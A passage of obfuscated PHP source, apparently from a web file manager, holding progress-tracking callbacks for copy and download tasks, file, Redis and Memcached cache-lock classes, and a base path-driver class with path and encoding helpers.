} public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d ê’ŒëÄÁ) { $f”ùƒß‡®½ =& $_SERVER[úÉ·öƒÑì©]; $e†—³øòíĞ =& $this->task; $e†—³øòíĞ[$f”ùƒß‡®½[1577]] = $d ê’ŒëÄÁ[$f”ùƒß‡®½[28]]; $e†—³øòíĞ[$f”ùƒß‡®½[1031]] = $d ê’ŒëÄÁ[$f”ùƒß‡®½[28]]; $this->update(); } public function copyFileStart($f¬¯£áĞ, $FŞ†ÚàíØƒ, $D—ò‹ŒÔ›Ó, $d ö¤áæ¡î, $DÁ‰¿®ÚîŠ, $E½ˆ¾§®¦Ä) { goto D¢åÃÍ¡»; DÃê¦Æ¼ëÃ: $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1577]] = $B¤†ÏÛÁ—è; $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1579]] = (int) $f¬¯£áĞ->size($FŞ†ÚàíØƒ); $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1580]] = 0; goto AŒÉ¤Âï™Ë; D¢åÃÍ¡»: $c¹œ¹Âé¯ =& $_SERVER[úÉ·öƒÑì©]; $B¤†ÏÛÁ—è = $DÁ‰¿®ÚîŠ; if ($B¤†ÏÛÁ—è == $GLOBALS[$c¹œ¹Âé¯[1590]]) { $B¤†ÏÛÁ—è = $GLOBALS[$c¹œ¹Âé¯[1591]]; } goto f©Ò§øÇÎæ; f©Ò§øÇÎæ: $GLOBALS[$c¹œ¹Âé¯[1591]] = $DÁ‰¿®ÚîŠ; $GLOBALS[$c¹œ¹Âé¯[1590]] = $E½ˆ¾§®¦Ä; $BÔæ´‡Ğœ– =& $this->task; goto DÃê¦Æ¼ëÃ; AŒÉ¤Âï™Ë: $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1031]] = $c¹œ¹Âé¯[33]; $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1581]] = $c¹œ¹Âé¯[33]; $BÔæ´‡Ğœ–[$c¹œ¹Âé¯[1582]] = 0; goto e‰¤²º½ˆ”; e‰¤²º½ˆ”: $this->update(); goto C›º¤¥ƒÂ; C›º¤¥ƒÂ: } public function copyFileEnd($aïºò˜‡—§, $c¤é±À®ÊÂ, $eê‰‹¥ÁïÌ, $e×›Ã ‰ÒŠ, $c·˜ƒ£¼, $b…¸Ë®…²) { $A«×ö”Æïí =& $_SERVER[úÉ·öƒÑì©]; $d‰¬‚«£¢ =& $this->task; $d‰¬‚«£¢[$A«×ö”Æïí[1580]] = $d‰¬‚«£¢[$A«×ö”Æïí[1579]]; $d‰¬‚«£¢[$A«×ö”Æïí[1581]] = $A«×ö”Æïí[33]; if ($c·˜ƒ£¼ == $d‰¬‚«£¢[$A«×ö”Æïí[1577]]) { $d‰¬‚«£¢[$A«×ö”Æïí[1583]] += $d‰¬‚«£¢[$A«×ö”Æïí[1579]]; $d‰¬‚«£¢[$A«×ö”Æïí[1584]] = $d‰¬‚«£¢[$A«×ö”Æïí[1583]]; $this->update(1); } else { $this->update(); $d‰¬‚«£¢[$A«×ö”Æïí[1580]] = 0; } self::log($A«×ö”Æïí[1592] . $c¤é±À®ÊÂ . $A«×ö”Æïí[67] . $e×›Ã ‰ÒŠ . $A«×ö”Æïí[229] . $c·˜ƒ£¼ . $A«×ö”Æïí[1593] . $d‰¬‚«£¢[$A«×ö”Æïí[1577]]); } public function updateFileEnd($aÕòæÛ’Ù, $d“¬Ú™°ªê) { goto dÁõİ¹œƒÅ; dÁõİ¹œƒÅ: $c‹ì·Ëµ× =& $_SERVER[úÉ·öƒÑì©]; $D à±˜ˆø˜ =& $this->task; $D à±˜ˆø˜[$c‹ì·Ëµ×[1577]] = $aÕòæÛ’Ù; goto C­òÛ–ÄÆÂ; BÄ‚¿áº: $this->update(1); self::log($c‹ì·Ëµ×[1594] . $aÕòæÛ’Ù); goto cƒ ó¯¸Ç˜; C­òÛ–ÄÆÂ: $D à±˜ˆø˜[$c‹ì·Ëµ×[1579]] = $d“¬Ú™°ªê; $D à±˜ˆø˜[$c‹ì·Ëµ×[1583]] += $d“¬Ú™°ªê; $D à±˜ˆø˜[$c‹ì·Ëµ×[1584]] = $D à±˜ˆø˜[$c‹ì·Ëµ×[1583]]; goto BÄ‚¿áº; cƒ ó¯¸Ç˜: } public function sourceModelCopy($b…¬ÅµöÔ) { goto BÚ†”ÙÀõÚ; D¾‡ãõô‡â: $Cß¶­´¹Ì« =& $this->task; $this->sourceModelCopyFlag = !0; $aÚØÏâêœ„ = 0; goto fŸÇ‘„’®†; fŸÇ‘„’®†: switch ($EùÂŠ¦ÒŞ) { case $e¥”â™Ç¾‰[544]: $aÚØÏâêœ„ = 1; break; case $e¥”â™Ç¾‰[547]: $Cß¶­´¹Ì«[$e¥”â™Ç¾‰[1577]] = $BçœË£·®²[$e¥”â™Ç¾‰[28]]; break; case $e¥”â™Ç¾‰[549]: $aÚØÏâêœ„ = intval($b…¬ÅµöÔ[$e¥”â™Ç¾‰[386]] * 0.4); break; case $e¥”â™Ç¾‰[551]: $aÚØÏâêœ„ = intval($b…¬ÅµöÔ[$e¥”â™Ç¾‰[386]] * 0.2); break; case $e¥”â™Ç¾‰[553]: $aÚØÏâêœ„ = intval($b…¬ÅµöÔ[$e¥”â™Ç¾‰[386]] * 0.4); break; } $this->update($aÚØÏâêœ„); $this->sourceModelCopyFlag = !1; goto DÎÊ³÷·; BÚ†”ÙÀõÚ: $e¥”â™Ç¾‰ =& $_SERVER[úÉ·öƒÑì©]; $EùÂŠ¦ÒŞ = $b…¬ÅµöÔ[0]; $BçœË£·®² = $b…¬ÅµöÔ[1]; goto D¾‡ãõô‡â; DÎÊ³÷·: } public function sourceRemove($EÉÑø¿óÒ, $A¢ºÄ¦›ã) { $A¿ğ›ä¬¿ =& $_SERVER[úÉ·öƒÑì©]; $this->sourceModelCopyFlag = !0; $a¥‚¿›½ğ‚ = 1; if (isset($EÉÑø¿óÒ[$A¿ğ›ä¬¿[81]])) { $a¥‚¿›½ğ‚ = $EÉÑø¿óÒ[$A¿ğ›ä¬¿[81]][$A¿ğ›ä¬¿[79]] + $EÉÑø¿óÒ[$A¿ğ›ä¬¿[81]][$A¿ğ›ä¬¿[80]] + 1; } $this->update($a¥‚¿›½ğ‚); $this->sourceModelCopyFlag = !1; } public function sourceMove($e„íãÃÏ¿) { $this->sourceRemove($e„íãÃÏ¿, !1); } public function curlProgress($Få‚›ÔÓÀæ, $f‰‡ââÍÁï, $B¨‡àŸ¸óë, $Eá×•Ô³‹, $FÒİÚæÂæ«) { $d»»Ç¹¡ =& $_SERVER[úÉ·öƒÑì©]; $b‡µ¦†ØÓ¢ =& $this->task; if ($FÒİÚæÂæ« > 0) { $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1031]] = $d»»Ç¹¡[1595]; $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1581]] = $d»»Ç¹¡[107]; if ($b‡µ¦†ØÓ¢[$d»»Ç¹¡[1579]]) { $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1580]] = $FÒİÚæÂæ«; } if ($b‡µ¦†ØÓ¢[$d»»Ç¹¡[1582]]) { $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1580]] = $FÒİÚæÂæ« + $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1582]]; } } else { if ($B¨‡àŸ¸óë > 0) { if ($b‡µ¦†ØÓ¢[$d»»Ç¹¡[1579]] == $f‰‡ââÍÁï) { $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1580]] = $B¨‡àŸ¸óë; $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1031]] = $d»»Ç¹¡[1596]; $b‡µ¦†ØÓ¢[$d»»Ç¹¡[1581]] = $d»»Ç¹¡[1102]; } } } $this->update(); } public function curlProgressStart($DïÃ‰Œ‘) { } public function curlProgressEnd($f‹°Š‚óí¥) { goto F¯ëµƒÉÈ; eÍ›§Ã¨È‘: $this->update(); goto e’³³ÅÕ¿©; B¿ñ¡Æ¿èŠ: $a¡¹¼¤÷¾÷ = $eëÏ›ò÷Õï[$d¨¥ùŒÍ±¦[1597]]; if ($a¡¹¼¤÷¾÷ == -1) { $a¡¹¼¤÷¾÷ = $eëÏ›ò÷Õï[$d¨¥ùŒÍ±¦[1598]]; } if ($AÒ´ƒóçÄ‚[$d¨¥ùŒÍ±¦[1581]] == $d¨¥ùŒÍ±¦[107] && $a¡¹¼¤÷¾÷) { $AÒ´ƒóçÄ‚[$d¨¥ùŒÍ±¦[1582]] += $a¡¹¼¤÷¾÷; } goto eÍ›§Ã¨È‘; F¯ëµƒÉÈ: $d¨¥ùŒÍ±¦ =& $_SERVER[úÉ·öƒÑì©]; $AÒ´ƒóçÄ‚ =& $this->task; $eëÏ›ò÷Õï = curl_getinfo($f‹°Š‚óí¥); goto B¿ñ¡Æ¿èŠ; e’³³ÅÕ¿©: } } goto bÊÁ›â³¶Ó; BğÏ©­»–‹: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $bñÀ“ÍÏùÈ =& $_SERVER[úÉ·öƒÑì©]; $AßÚ¡ÛÛî‘ = $GLOBALS[$bñÀ“ÍÏùÈ[6]][$bñÀ“ÍÏùÈ[356]]; self::$cachePath = $AßÚ¡ÛÛî‘[$bñÀ“ÍÏùÈ[193]][$bñÀ“ÍÏùÈ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($B’ÔÇ‹¹°Ì, $f½çĞÃØ»¶ = 0) { goto BìÕùÑºâø; cõ³ÒÉÈì: $this->unlock($B’ÔÇ‹¹°Ì); return !1; goto e¤Š½´±ôª; f¼‘˜¬ŸÇ: $cÓŞî¸Æ¿ò = rtrim(self::$cachePath, $fã¸·ñ˜–È[8]) . $fã¸·ñ˜–È[834] . md5($B’ÔÇ‹¹°Ì) . $fã¸·ñ˜–È[831]; if (file_exists($cÓŞî¸Æ¿ò) && filemtime($cÓŞî¸Æ¿ò) && filemtime($cÓŞî¸Æ¿ò) < time() - 10) { @unlink($cÓŞî¸Æ¿ò); } do { if (file_exists($cÓŞî¸Æ¿ò)) { cacheLockWait(); continue; } $d§ùÀ¢ÓÜˆ = fopen($cÓŞî¸Æ¿ò, $fã¸·ñ˜–È[835]); if (!$d§ùÀ¢ÓÜˆ) { return !1; } $CÇœ¤ˆâ·¢ = flock($d§ùÀ¢ÓÜˆ, LOCK_EX | LOCK_NB); self::$caches[$B’ÔÇ‹¹°Ì] = array($fã¸·ñ˜–È[836] => $d§ùÀ¢ÓÜˆ, $fã¸·ñ˜–È[193] => $cÓŞî¸Æ¿ò); fwrite($d§ùÀ¢ÓÜˆ, $DÂâô†„‹…); clearstatcache(); if ($d§ùÀ¢ÓÜˆ && $CÇœ¤ˆâ·¢) { return !0; } cacheLockWait(); } while (microtime(!0) < $DÂâô†„‹…); goto cõ³ÒÉÈì; BìÕùÑºâø: $fã¸·ñ˜–È =& $_SERVER[úÉ·öƒÑì©]; $a´¡¨÷˜³× = microtime(!0); $DÂâô†„‹… = $a´¡¨÷˜³× + $f½çĞÃØ»¶ + 0.0001; goto f¼‘˜¬ŸÇ; e¤Š½´±ôª: } public function lockGet($Fˆ¦­ÏùÍ) { $f…‘Ó’éŠ =& $_SERVER[úÉ·öƒÑì©]; $e³é²ªÜõ = rtrim(self::$cachePath, $f…‘Ó’éŠ[8]) . $f…‘Ó’éŠ[834] . md5($Fˆ¦­ÏùÍ) . $f…‘Ó’éŠ[831]; return file_exists($e³é²ªÜõ); } public function unlock($Dğœáì”Á) { goto e‚ìæ™°Ã; BëïËí±øÒ: unset(self::$caches[$Dğœáì”Á]); goto Eª§“¬™²; Eºª­°‡ø: @flock($CëŠ·É·Îº[$f‘°“‡ãÊğ[836]], LOCK_UN); @fclose($CëŠ·É·Îº[$f‘°“‡ãÊğ[836]]); @unlink($CëŠ·É·Îº[$f‘°“‡ãÊğ[193]]); goto BëïËí±øÒ; e‚ìæ™°Ã: $f‘°“‡ãÊğ =& $_SERVER[úÉ·öƒÑì©]; $CëŠ·É·Îº = self::$caches[$Dğœáì”Á]; if (!$CëŠ·É·Îº) { return; } goto Eºª­°‡ø; Eª§“¬™²: } } class CacheLockRedis { public function lock($aÕ„ªÁ©»ó, $f½õÅ¢£™„ = 10) { $fÒÒÌŠ‹Œ = Cache::init(); $Cß¨Ï•ğ£° = microtime(!0) + $f½õÅ¢£™„; while (microtime(!0) < $Cß¨Ï•ğ£°) { $AéºÏ‹ñ¼ = $fÒÒÌŠ‹Œ->get($aÕ„ªÁ©»ó); if (!$AéºÏ‹ñ¼) { $c‡™’¡µ = $fÒÒÌŠ‹Œ->setLock($aÕ„ªÁ©»ó, $Cß¨Ï•ğ£°, $f½õÅ¢£™„); if ($c‡™’¡µ) { return !0; } } else { if ($AéºÏ‹ñ¼ < microtime(!0)) { $fÒÒÌŠ‹Œ->set($aÕ„ªÁ©»ó, $Cß¨Ï•ğ£°, $f½õÅ¢£™„ * 2); if ($fÒÒÌŠ‹Œ->get($aÕ„ªÁ©»ó) === $AéºÏ‹ñ¼) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($F®àÏî¬¯) { return Cache::init()->get($F®àÏî¬¯); } public function unlock($d‘Íº¤öÛ) { return Cache::init()->remove($d‘Íº¤öÛ); } } class CacheLockMemcached { public function lock($f÷Ç£×•¿, $aÜìÆäğºø = 0) { $B¼ŒÓå‚è¨ = Cache::init(); $b â¡×Ú‘ = microtime(!0) + $aÜìÆäğºø; while (microtime(!0) < $b â¡×Ú‘) { $cÇ‹ÑòªÙá = $B¼ŒÓå‚è¨->get($f÷Ç£×•¿); if (!$cÇ‹ÑòªÙá || $cÇ‹ÑòªÙá < microtime(!0)) { $Dƒ‘äÄ ‘ = $B¼ŒÓå‚è¨->handle->add($f÷Ç£×•¿, $b â¡×Ú‘, $aÜìÆäğºø); if ($Dƒ‘äÄ ‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F¦¹„½) { return Cache::init()->get($F¦¹„½); } public function unlock($F‘ÛÌ°ö±’) { return Cache::init()->remove($F‘ÛÌ°ö±’); } } goto E–÷®êÜõ¾; aà·¯„²¥°: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a‹Ãø¤ï² =& $_SERVER[úÉ·öƒÑì©]; $this->objectDriver = array($a‹Ãø¤ï²[57], $a‹Ãø¤ï²[58], $a‹Ãø¤ï²[59], $a‹Ãø¤ï²[60], $a‹Ãø¤ï²[61], $a‹Ãø¤ï²[62], $a‹Ãø¤ï²[63], $a‹Ãø¤ï²[64], $a‹Ãø¤ï²[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($B™‚íóö¼¸) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($B™‚íóö¼¸, $_SERVER[úÉ·öƒÑì©][8]); } return $B™‚íóö¼¸; } public function iconvApp($FÈĞ•¦ğÂ) { return $FÈĞ•¦ğÂ; } public function iconvSystem($E§…ƒİåŞø) { return $E§…ƒİåŞø; } public function iconvTo($fŸô…äÃŠä, $FÓ‚™õ“Š…, $B°»ãŒÆİˆ) { goto c­šŞ¡«é˜; c­šŞ¡«é˜: $D³À…Úñ =& $_SERVER[úÉ·öƒÑì©]; if (!$fŸô…äÃŠä || !function_exists($D³À…Úñ[66])) { return $fŸô…äÃŠä; } static $Bóî›·‹æ® = array(); goto DŠçÇ£Âå; A§àù îæí: $AİèÄ¤¯× = $AİèÄ¤¯× ? $AİèÄ¤¯× : $fŸô…äÃŠä; if (strstr($AİèÄ¤¯×, $D³À…Úñ[70])) { $AİèÄ¤¯× = str_replace($D³À…Úñ[70], $D³À…Úñ[71], $AİèÄ¤¯×); } $Bóî›·‹æ®[$FÓ‚™õ“Š… . $D³À…Úñ[67] . $B°»ãŒÆİˆ . $D³À…Úñ[68] . $fŸô…äÃŠä] = $AİèÄ¤¯×; goto A²¢‰ó¸øå; CáÂ»·Ã¼Ò: return $AİèÄ¤¯×; goto Cì‡¼ßÍ¯£; DŠçÇ£Âå: $B»îí¿¿ŞŒ = $FÓ‚™õ“Š… . $D³À…Úñ[67] . $B°»ãŒÆİˆ . $D³À…Úñ[68] . $fŸô…äÃŠä; if (isset($Bóî›·‹æ®[$B»îí¿¿ŞŒ])) { return $Bóî›·‹æ®[$B»îí¿¿ŞŒ]; } if (function_exists($D³À…Úñ[69])) { $AİèÄ¤¯× = @mb_convert_encoding($fŸô…äÃŠä, $B°»ãŒÆİˆ, $FÓ‚™õ“Š…); } else { $AİèÄ¤¯× = @iconv($FÓ‚™õ“Š…, $B°»ãŒÆİˆ, $fŸô…äÃŠä); } goto A§àù îæí; A²¢‰ó¸øå: $Bóî›·‹æ®[$B°»ãŒÆİˆ . $D³À…Úñ[67] . $FÓ‚™õ“Š… . $D³À…Úñ[68] . $fŸô…äÃŠä] = $fŸô…äÃŠä; $Bóî›·‹æ®[$B°»ãŒÆİˆ . $D³À…Úñ[67] . $FÓ‚™õ“Š… . $D³À…Úñ[68] . $AİèÄ¤¯×] = $fŸô…äÃŠä; $Bóî›·‹æ®[$FÓ‚™õ“Š… . $D³À…Úñ[67] . $B°»ãŒÆİˆ . $D³À…Úñ[68] . $AİèÄ¤¯×] = $AİèÄ¤¯×; goto CáÂ»·Ã¼Ò; Cì‡¼ßÍ¯£: } public function getPathInner($c„×œŒ’Ç) { $aÑÕ¸óÃ¥î = IO::init($c„×œŒ’Ç); return $aÑÕ¸óÃ¥î->path; } public function getPathOuter($dåÏ¶„¶ö¨) { $B÷í”Â¿Š =& $_SERVER[úÉ·öƒÑì©]; $eã£¨î£µ“ = strlen(trim($this->pathBase, $B÷í”Â¿Š[8])); $dåÏ¶„¶ö¨ = substr(trim($dåÏ¶„¶ö¨, $B÷í”Â¿Š[8]), $eã£¨î£µ“); return $this->pathDriver . $B÷í”Â¿Š[8] . ltrim($dåÏ¶„¶ö¨, $B÷í”Â¿Š[8]); } public function isParentOf($cÜÛ’ç¨†¦, $BùÕ÷Û‘¯›) { $b½½íŞÙÅ“ =& $_SERVER[úÉ·öƒÑì©]; $cÜÛ’ç¨†¦ = rtrim(strtolower($cÜÛ’ç¨†¦), $b½½íŞÙÅ“[8]) . $b½½íŞÙÅ“[8]; $BùÕ÷Û‘¯› = rtrim(strtolower($BùÕ÷Û‘¯›), $b½½íŞÙÅ“[8]) . $b½½íŞÙÅ“[8]; $fèõ¥ğî” = strpos($BùÕ÷Û‘¯›, $cÜÛ’ç¨†¦) === 0; return $fèõ¥ğî”; } public function getType() { $b¥ó¿–ê·Ø =& $_SERVER[úÉ·öƒÑì©]; $CßÑÉ¸ˆºÔ = str_replace($b¥ó¿–ê·Ø[72], $b¥ó¿–ê·Ø[33], get_class($this)); return strtolower($CßÑÉ¸ˆºÔ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($f –¬ÉÒó©, $B¶ÅùÙ‹®Ã) { $F¤¢àèæÄ =& $_SERVER[úÉ·öƒÑì©]; $e½Û£Í¯„• = rtrim($f –¬ÉÒó©, $F¤¢àèæÄ[8]) . $F¤¢àèæÄ[8] . $B¶ÅùÙ‹®Ã; $CÚ¼àçÁƒ» = $this->exist($e½Û£Í¯„•); return $CÚ¼àçÁƒ» ? $e½Û£Í¯„• : !1; } public function setModifyTime($c¹ôÁˆá—ˆ, $fÀÉ‹šÁĞê = '') { } public function renameObject($e‘ë‰îø‚‹, $FÓ‰¦ÌÂ) { goto BŒÉ¶Ë¢¿; fáÑóÇ¢¶ç: $e‘ë‰îø‚‹ = $this->getPathOuter($e‘ë‰îø‚‹); $FÓ‰¦ÌÂ = $this->pathFather($e‘ë‰îø‚‹) . $FÓ‰¦ÌÂ; if (IO::isFile($e‘ë‰îø‚‹)) { $B†Æ”¨Àô¯ = IO::copy($e‘ë‰îø‚‹, $this->pathFather($e‘ë‰îø‚‹), REPEAT_RENAME_FOLDER, $CÑÃĞÔéË); if ($B†Æ”¨Àô¯) { IO::remove($e‘ë‰îø‚‹); } } else { $B†Æ”¨Àô¯ = IO::mkdir($FÓ‰¦ÌÂ); if (!$B†Æ”¨Àô¯) { return !1; } $C™œÇÇğØæ = IO::listPath($e‘ë‰îø‚‹, !0); $F³Š÷ÀóÔ¹ = array_merge($C™œÇÇğØæ[$E„²ÄÎ¦é²[74]], $C™œÇÇğØæ[$E„²ÄÎ¦é²[75]]); foreach ($F³Š÷ÀóÔ¹ as $F»¼´£§ºÚ) { IO::move($F»¼´£§ºÚ[$E„²ÄÎ¦é²[76]], $FÓ‰¦ÌÂ, REPEAT_RENAME_FOLDER); } IO::remove($e‘ë‰îø‚‹); } goto c’¾„ ™ò”; BŒÉ¶Ë¢¿: $E„²ÄÎ¦é² =& $_SERVER[úÉ·öƒÑì©]; $CÑÃĞÔéË = $FÓ‰¦ÌÂ; Hook::trigger($E„²ÄÎ¦é²[73], $this, $e‘ë‰îø‚‹, $this, $this->pathFather($e‘ë‰îø‚‹) . $FÓ‰¦ÌÂ); goto fáÑóÇ¢¶ç; c’¾„ ™ò”: return $B†Æ”¨Àô¯ ? $FÓ‰¦ÌÂ : !1; goto b‰òö­’¡Î; b‰òö­’¡Î: } public function tempFile($f­öãÈÚè = '', $d…ôÈ¬Øõª = '') { goto BÎŒŸ×; CóŠîå›î¹: $E‹¯‰å£‰ë = $DæÁÓÒÊá¸ . $f­öãÈÚè; @touch($E‹¯‰å£‰ë); if ($d…ôÈ¬Øõª) { file_put_contents($E‹¯‰å£‰ë, $d…ôÈ¬Øõª); } goto B¨¬ãôåõ½; B¨¬ãôåõ½: return $E‹¯‰å£‰ë; goto A£ëÄ¥”ç‹; BÎŒŸ×: if (!$f­öãÈÚè) { $f­öãÈÚè = rand_string(15); } $DæÁÓÒÊá¸ = TEMP_FILES . rand_string(15) . $_SERVER[úÉ·öƒÑì©][8]; @mkdir($DæÁÓÒÊá¸, 511, !0); goto CóŠîå›î¹; A£ëÄ¥”ç‹: } public function tempFileRemve($EæÄÖä­¤×) { @unlink($EæÄÖä­¤×); @rmdir($this->pathFather($EæÄÖä­¤×)); } public function mkfile($f¹‚®œµÊ¥, $cÌ¢Ë…óõ¼ = '', $d“…ÁÙÍ«½ = REPEAT_RENAME) { } public function mkdir($A˜›Å•ÔÃ¼, $D×ÔÄíëó• = REPEAT_SKIP) { } public function delFile($DÅÏ† ’¢°) { } public function delFolder($E“„êÌ”·¨) { } public function copyFile($eÊô¢¼ïö, $F‘ÀÂÊĞˆ) { } public function moveFile($f†š“¥ó¢¥, $b¢œ¬ÆÍÏˆ) { } public function remove($føÕÀ‚Ë©Ô) { if ($this->isFile($føÕÀ‚Ë©Ô)) { return $this->delFile($føÕÀ‚Ë©Ô); } return $this->delFolder($føÕÀ‚Ë©Ô); } public function rename($eƒ¯ãÑâÖæ, $Få¡®Ø÷Öé) { } public function exist($Bƒ™„âù»Œ) { } public function findByHash($BÒÚ¸­îÁ = '', $E±„¬“†ŸŞ = '') { return !1; } public function isFile($D†ÑÂ¥ÆÃµ) { } public function isFolder($F™šà“ä¶) { } public function size($bõõ´©Ö§ß) { } public function info($D°È…„³«§) { } public function infoSimple($C’¸”) { return $this->info($C’¸”); } public function infoAuth($FªËÂÅÃ²÷) { return $this->info($FªËÂÅÃ²÷); } public function infoFull($eÊ´¼»ğ‚õ) { return $this->info($eÊ´¼»ğ‚õ); } public function infoWithChildren($eÊ¸ô¢Õ) { $CÓöŠğÙÔ =& $_SERVER[úÉ·öƒÑì©]; static $F±¿À‡¤£ = array(); if (isset($F±¿À‡¤£[$eÊ¸ô¢Õ])) { return $F±¿À‡¤£[$eÊ¸ô¢Õ]; } $Eé¤¢ñ«“Å = $this->info($eÊ¸ô¢Õ); if ($Eé¤¢ñ«“Å && $Eé¤¢ñ«“Å[$CÓöŠğÙÔ[29]] == $CÓöŠğÙÔ[77]) { $C¶‰Ş§Ÿ¹« = array($CÓöŠğÙÔ[78] => 0, $CÓöŠğÙÔ[79] => 0, $CÓöŠğÙÔ[80] => 0); $this->infoChildren($eÊ¸ô¢Õ, $C¶‰Ş§Ÿ¹«); $Eé¤¢ñ«“Å[$CÓöŠğÙÔ[78]] = $C¶‰Ş§Ÿ¹«[$CÓöŠğÙÔ[78]]; $Eé¤¢ñ«“Å[$CÓöŠğÙÔ[81]] = array($CÓöŠğÙÔ[82] => $C¶‰Ş§Ÿ¹«[$CÓöŠğÙÔ[79]], $CÓöŠğÙÔ[83] => $C¶‰Ş§Ÿ¹«[$CÓöŠğÙÔ[80]]); $F±¿À‡¤£[$eÊ¸ô¢Õ] = $Eé¤¢ñ«“Å; } return $Eé¤¢ñ«“Å; } public function listPath($bñô¬§§¡’, $bùÍóÎ§ƒ = false) { } public function has($CÛÖ¸¼š°, $DÒ­—†ã›Ò = false, $EŠ¬ØÛµã = false) { } public function canRead($b¡ÄÇˆÇë×) { } public function canWrite($Eà»ÜÊÁ…ƒ) { } public function getContent($cºàÍ˜®°“) { } public function setContent($fÜœØÊ«ÃŞ, $f§ÄöáœªÀ = '') { } protected function infoChildren($d…—¬²˜¸ï, &$aÚ·‰ÕÊ¹İ) { $c‘‘»Îğ†ë =& $_SERVER[úÉ·öƒÑì©]; check_abort_echo(); $B¦…îğœ¶· = $this->listPath($d…—¬²˜¸ï, !0); $B¦…îğœ¶· = array_merge($B¦…îğœ¶·[$c‘‘»Îğ†ë[75]], $B¦…îğœ¶·[$c‘‘»Îğ†ë[74]]); foreach ($B¦…îğœ¶· as $DôåÅóŸ¯Ç) { if ($DôåÅóŸ¯Ç[$c‘‘»Îğ†ë[29]] == $c‘‘»Îğ†ë[77]) { $aÚ·‰ÕÊ¹İ[$c‘‘»Îğ†ë[80]]++; $A¡Í Ï¸¡¶ = $this->getPathInner($DôåÅóŸ¯Ç[$c‘‘»Îğ†ë[76]]); $this->infoChildren($A¡Í Ï¸¡¶, $aÚ·‰ÕÊ¹İ); } else { $aÚ·‰ÕÊ¹İ[$c‘‘»Îğ†ë[79]]++; $aÚ·‰ÕÊ¹İ[$c‘‘»Îğ†ë[78]] += $DôåÅóŸ¯Ç[$c‘‘»Îğ†ë[78]]; } } } public function fileSubstr($aãšóÁÉà, $f½©«ñ¬£, $E™ƒ—ğŠí®) { } public function listAll($fÙ‰¶óĞš×) { } public function listAllMake($cÛ¸ËòÔ×ñ, &$Aâ÷ØŠ£ì›) { $b»ª’ŸšÈ™ =& $_SERVER[úÉ·öƒÑì©]; check_abort_echo(); $A“ÔÈìØŠ = $this->listPath($cÛ¸ËòÔ×ñ, !0); if (!$A“ÔÈìØŠ) { return; } $AÃ¯ëî™ = array_merge($A“ÔÈìØŠ[$b»ª’ŸšÈ™[75]], $A“ÔÈìØŠ[$b»ª’ŸšÈ™[74]]); foreach ($AÃ¯ëî™ as $b¾¸Î¿œµÇ) { goto c§Äİ¶á; B„÷öÏîÕ: if (isset($b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[84]])) { $EæĞÄİ’Òƒ[$b»ª’ŸšÈ™[84]] = $b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[84]]; } if (!$C†ÔÚ Úâ) { $Aâ÷ØŠ£ì›[] = $EæĞÄİ’Òƒ; continue; } $Aâ÷ØŠ£ì›[] = $EæĞÄİ’Òƒ; goto c®¢´’ŒÍ¶; c§Äİ¶á: $C†ÔÚ Úâ = $b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[29]] == $b»ª’ŸšÈ™[77]; $EæĞÄİ’Òƒ = array($b»ª’ŸšÈ™[76] => $b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[76]], $b»ª’ŸšÈ™[77] => $C†ÔÚ Úâ); if (isset($b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[78]])) { $EæĞÄİ’Òƒ[$b»ª’ŸšÈ™[78]] = $b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[78]]; } goto B„÷öÏîÕ; c®¢´’ŒÍ¶: $this->listAllMake($b¾¸Î¿œµÇ[$b»ª’ŸšÈ™[76]], $Aâ÷ØŠ£ì›); goto d¸»ò¸åƒ²; d¸»ò¸åƒ²: } } public function listAllSimple($a¥´ÅˆõÕ•) { $Cñ„ˆŒ¶öİ =& $_SERVER[úÉ·öƒÑì©]; $fñÔª³“˜‹ = array(); $ağ‚‘â†ª™ = $this->listAll($a¥´ÅˆõÕ•); $cÀ´ƒ×Œˆ› = $this->getPathOuter($a¥´ÅˆõÕ•); foreach ($ağ‚‘â†ª™ as $a¡Ë›…¶) { goto AÅŸÀƒóÄ¯; FšÓè®Ê½‹: $eÎù¿øö = array($Cñ„ˆŒ¶öİ[76] => $eó°‡éç…, $Cñ„ˆŒ¶öİ[77] => $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[77]]); if (isset($a¡Ë›…¶[$Cñ„ˆŒ¶öİ[78]]) && !$a¡Ë›…¶[$Cñ„ˆŒ¶öİ[77]]) { $eÎù¿øö[$Cñ„ˆŒ¶öİ[78]] = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[78]]; } if (isset($a¡Ë›…¶[$Cñ„ˆŒ¶öİ[84]])) { $eÎù¿øö[$Cñ„ˆŒ¶öİ[84]] = $a¡Ë›…¶[$Cñ„ˆŒ¶öİ[84]]; } goto E®­Ï©„‹Ç; E®­Ï©„‹Ç: if (!$a¡Ë›…¶[$Cñ„ˆŒ¶öİ[77]]) { $eÎù¿øö[$Cñ„ˆŒ¶öİ[86]] = $fØßŠ¼—„›; } $fñÔª³“˜‹[] = $eÎù¿øö; goto EÂ¼àöãŠ˜; AÅŸÀƒóÄ¯: $fØßŠ¼—„› = 